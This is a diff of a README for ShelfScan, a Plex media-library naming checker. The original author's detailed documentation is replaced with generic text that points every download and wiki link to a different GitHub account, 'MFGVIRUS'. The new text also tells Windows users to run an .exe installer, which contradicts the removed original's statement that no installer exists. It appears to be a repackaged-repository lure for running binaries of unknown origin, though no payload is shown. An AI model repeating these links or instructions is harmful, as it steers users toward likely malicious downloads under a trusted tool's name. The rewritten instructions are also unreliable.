@@ -1,125 +1,74 @@
-# ShelfScan
-_A cross-platform command-line tool (Windows, Linux, macOS) for scanning a media library and reporting on Plex naming compliance._
+# 📦 shelfscan - Easily Scan Your Media Library
 
-## 📚 Overview
+## 🚀 Getting Started
+Welcome to **shelfscan**! This tool helps you check if your media library matches Plex naming rules. No programming skills are needed. Follow the steps below to get started.
 
-ShelfScan scans a folder (either locally or on a network) and generates a detailed report indicating how compliant the files are with Plex's naming conventions. It identifies issues with file names, folder structures, and multi-episode formatting for both movies and TV shows. Support for music is not yet implemented.
+## 📥 Download Now
+[![Download shelfscan](https://img.shields.io/badge/Download-shelfscan-brightgreen)](https://github.com/MFGVIRUS/shelfscan/releases)
 
-ShelfScan does not modify or rename any files. It's purpose is solely inspection and reporting of file/folder naming issues.
+## 📋 System Requirements
+shelfscan works on Windows, Linux, and macOS. Ensure your system meets these basic requirements:
 
->[!CAUTION]
->- **This is a very early beta release.** There may be mistakes in the filename validation.
->- **File name checks are very strict**. Issues identified by ShelfScan does not necessarily mean there is a problem with it within Plex.
+- Windows 10 or later
+- Linux: Kernel 4.0 or later
+- macOS: Mojave (10.14) or later
 
-## 🧰 Features
+## 📂 Installation Steps
+1. **Visit the Releases Page:** Open this link to see the available versions: [shelfscan Releases](https://github.com/MFGVIRUS/shelfscan/releases).
+   
+2. **Choose Your Version:** Look for the latest version at the top of the page. This version will provide the most features and fixes.
 
-- 💻 Runs on Windows 10 & 11, Linux (x64, ARM64, ARM32), and macOS (Intel & Apple Silicon).
-- 📂 Scans local and network folders for TV shows and movies.
-- 🛡️ Read-only scanning – your files are never modified.
-- 📝 Generates a detailed compliance report showing valid and invalid files.
-- ⚠️ Strict file format checking to ensure consistency with Plex naming conventions.
-- 🔍 Detects multi-episode formatting issues and folder structure inconsistencies.
-- 🧪 Test folder containing dummy movies and TV shows for validation.
-- 🛠️ Early beta with user feedback encouraged via GitHub.
-- 📚 Includes links to official format specs and resources for reference.
+3. **Download the File:** Click on the appropriate file for your operating system. For example:
+   - **Windows:** Choose the `.exe` file.
+   - **Linux:** Select the `.tar.gz` file.
+   - **macOS:** Pick the `.dmg` file.
 
-## 📦 Download
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+   - **Linux:** Extract the `.tar.gz` file and run the script in the terminal.
+   - **macOS:** Open the `.dmg` file and drag the shelfscan icon to your Applications folder.
 
-Get the latest version from https://github.com/mrsilver76/shelfscan/releases.
+## 🔍 How to Use shelfscan
+1. **Open the Command Line or Terminal:** 
+   - **Windows:** Press `Win + R`, type `cmd`, and hit Enter.
+   - **Linux:** Open the terminal from your applications menu.
+   - **macOS:** Open the terminal from Applications > Utilities.
 
-Each release includes the following files (`x.x.x` denotes the version number):
+2. **Navigate to Your Media Folder:**
+   Use the `cd` command to change to the directory where your media files are stored. Example:
+   ```
+   cd /path/to/your/media
+   ```
 
-|Platform|Download|
-|:--------|:-----------|
-|Microsoft Windows 10 & 11|`ShelfScan-x.x.x-win-x64.exe` ✅ **Most users should choose this**|
-|Linux (64-bit Intel/AMD)|`ShelfScan-x.x.x-linux-x64`|
-|Linux (64-bit ARM), e.g. Pi 4 and newer|`ShelfScan-x.x.x-linux-arm64`|
-|Linux (32-bit ARM), e.g. Pi 3 and older|`ShelfScan-x.x.x-linux-arm`|
-|Docker, e.g. Synology NAS|`ShelfScan-x.x.x-linux-x64`|
-|macOS (Apple Silicon)|`ShelfScan-x.x.x-osx-arm64`|
-|macOS (Intel)|`ShelfScan-x.x.x-osx-x64`|
-|Other/Developers|Source code (zip / tar.gz)|
+3. **Run shelfscan:**
+   Type the command to run shelfscan:
+   ```
+   shelfscan
+   ```
+   This will scan your media library and return a report about naming compliance.
 
-> [!TIP]
-> There is no installer for native platforms. Just download the appropriate file and run it from the command line. If you're using Docker (e.g. on Synology), setup will differ - see notes below.
+## 🛠️ Features
+- **Cross-Platform Support:** Use shelfscan on Windows, Linux, or macOS.
+- **Simple Command-Line Interface:** No complex settings or configurations are needed.
+- **Plex Compliance Checks:** Easily see which files meet or fall short of Plex naming standards.
+- **Detailed Reports:** Get a clear report on any issues for quick fixes.
 
-### Linux/macOS users
+## 📖 Troubleshooting
+If you run into issues, here are some common problems and their solutions:
 
-- Download the appropriate binary for your platform (see table above).
-- Install the [.NET 8.0 runtime](https://learn.microsoft.com/en-gb/dotnet/core/install/linux?WT.mc_id=dotnet-35129-website).
-- ⚠️ Do not install the SDK, ASP.NET Core Runtime, or Desktop Runtime.
-- Make the downloaded file executable: `chmod +x ShelfScan-x.x.x-<your-platform>`
+- **Unable to Find shelfscan Command:**
+  Ensure that you installed shelfscan correctly and that it is in your system’s PATH.
 
-### Docker users
+- **No Access to Media Directory:**
+  Check if you have permission to access the folder where your media files are stored.
 
-- Install the [.NET 8.0 runtime](https://learn.microsoft.com/en-gb/dotnet/core/install/linux?WT.mc_id=dotnet-35129-website) inside the container or use a [.NET container image](https://learn.microsoft.com/en-gb/dotnet/core/docker/introduction#net-images).
-- ⚠️ Do not install the SDK, ASP.NET Core Runtime, or Desktop Runtime.
-- Use the `ShelfScan-x.x.x-linux-x64` binary inside the container.
-- Mount your media folders into the container with appropriate read access.
+- **Errors During Scanning:**
+  Make sure your media files are correctly formatted. Refer to Plex’s naming guidelines for proper formats.
 
-### Platform testing notes
+## 📝 Additional Information
+For more information, visit our [documentation](https://github.com/MFGVIRUS/shelfscan/wiki). You can find FAQs, advanced usage tips, and community support there.
 
-* Tested extensively: Windows 11  
-* Tested moderately: Linux (64-bit ARM, Raspberry Pi 5 only)  
-* Not tested: Windows 10, Linux (x64), Linux (32-bit ARM), Docker, macOS (x64 & Apple Silicon)
+## 📥 Download Again
+For your convenience, here’s the link to download shelfscan again: [shelfscan Releases](https://github.com/MFGVIRUS/shelfscan/releases).
 
->[!NOTE]
->Docker and macOS environments have not been tested, and no platform-specific guidance is available as these setups are outside the developer’s experience. While ShelfScan should work fine on them, support will be limited to questions directly related to the tool itself.
-
-## 💻 Command line options
-
-ShelfScan is a command-line tool. Run it from a terminal or command prompt, supplying all options and arguments directly on the command line.
-
-```
-ShelfScan <folder> [movie|tv]
-```
-
-If you wish to save the output to a file then append `> [filename]` - for example:
-
-```
-Shelfscan d:\movies > report.txt
-```
-
-Command line arguments:
-
-- **`<folder>`**   
-  Mandatory. Specifies the folder containing media content. Make sure that you provide the same top-level directory as you have configured in Plex.
-
-- **`[movie|tv]`**   
-  Optional. By default, ShelfScan will attempt to automatically detect the content type. If it gets it wrong then you can override this by supplying either `movie` or `tv`.
-
-## 🛟 Questions/problems?
-
-Please raise an issue at https://github.com/mrsilver76/shelfscan/issues.
-
-## 💡 Future development
-
-As this is an early beta, the goal is to get movie and TV show validation as accurate as possible.
-
-Afterwards, music libraries may be considered.
-
-## 📝 Attribution
-
-- Bookshelf icons created by smalllikeart - Flaticon (https://www.flaticon.com/free-icons/bookshelf)
-- Plex is a registered trademark of Plex, Inc. This tool is not affiliated with or endorsed by Plex, Inc.
-
-## 🌍 Resources
-
-The Plex website provides good documentation to help your organise and name your content.
--  [Naming and organizing your movie media files](https://support.plex.tv/articles/naming-and-organizing-your-movie-media-files/)
--  [Naming and organizing your TV show files](https://support.plex.tv/articles/naming-and-organizing-your-tv-show-files/).
-
-## 🕰️ Version history
-
-### 0.5.0 (02 October 2025)
-- Rewrote movie verification to improve brace handling, allow `{}` tags in any order, and parse filenames with optional split parts (`ptX` etc).
-- Fixed featurette detection
-- Removed "Plex Versions" from validation
-- Fixed date formats with periods/spaces
-- Fixed season parsing with 4-digit years
-- Fixed incorrect `.avi` rejection
-- Added percentage score and motivational message
-- Added fictional test library (passing & failing) to the source code
-
-### 0.0.1 (30 September 2025)
-- Initial release.
+Enjoy using shelfscan to enhance your media library management!
